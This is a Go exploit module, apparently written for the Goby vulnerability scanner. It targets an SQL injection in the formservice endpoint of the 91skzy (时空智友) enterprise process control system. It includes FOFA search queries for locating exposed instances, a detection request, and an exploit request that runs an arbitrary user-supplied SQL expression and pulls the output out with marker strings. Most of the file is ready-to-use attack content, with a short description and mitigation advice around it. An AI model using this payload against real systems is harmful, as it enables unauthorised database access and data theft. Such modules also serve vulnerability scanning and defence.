package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "91skzy Enterprise process control system formservice SQL Injection vulnerability",
    "Description": "<p>Spatiotemporal Intelligent Friend enterprise process management and control system is a system that uses JAVA development to provide process management and control for enterprises.</p><p></p><p>Spatiotemporal Wisdom enterprise process management and control system formservice SQL injection vulnerability, attackers can use the vulnerability to obtain sensitive database information.</p>",
    "Product": "时空智友企业流程化管控系统",
    "Homepage": "http://www.91skzy.net",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"企业流程化管控系统\"",
    "GobyQuery": "body=\"企业流程化管控系统\"",
    "Level": "2",
    "Impact": "<p>Spatiotemporal Wisdom enterprise process management and control system formservice SQL injection vulnerability, attackers can use the vulnerability to obtain sensitive database information.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "SUSER_NAME()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/formservice?service=workflow.sqlResult",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"params\": {\"a\": \"11\"}, \"sql\": \"select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1234f56'))\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "t>0xbc43c0d0623a5aaa6d9767edd62605ad</root>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/formservice?service=workflow.sqlResult",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"params\": {\"a\": \"11\"}, \"sql\": \"select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1234f56')) + {{{sql}}}+sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1234f56'))\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bc43c0d0623a5aaa6d9767edd62605a",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|0xbc43c0d0623a5aaa6d9767edd62605ad(.*?)0xbc43c0d0623a5aaa6d9767edd62605ad"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "时空智友企业流程化管控系统 formservice SQL 注入漏洞",
            "Product": "时空智友企业流程化管控系统",
            "Description": "<p>时空智友企业流程化管控系统是使用JAVA开发为企业提供流程化管控的一款系统。</p><p>时空智友企业流程化管控系统 formservice SQL注入漏洞,攻击者可利用该漏洞获取数据库的敏感信息等.</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>时空智友企业流程化管控系统 formservice SQL注入漏洞,攻击者可利用该漏洞获取数据库的敏感信息等.</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "91skzy Enterprise process control system formservice SQL Injection vulnerability",
            "Product": "时空智友企业流程化管控系统",
            "Description": "<p>Spatiotemporal Intelligent Friend enterprise process management and control system is a system that uses JAVA development to provide process management and control for enterprises.</p><p></p><p>Spatiotemporal Wisdom enterprise process management and control system formservice SQL injection vulnerability, attackers can use the vulnerability to obtain sensitive database information.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Spatiotemporal Wisdom enterprise process management and control system formservice SQL injection vulnerability, attackers can use the vulnerability to obtain sensitive database information.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
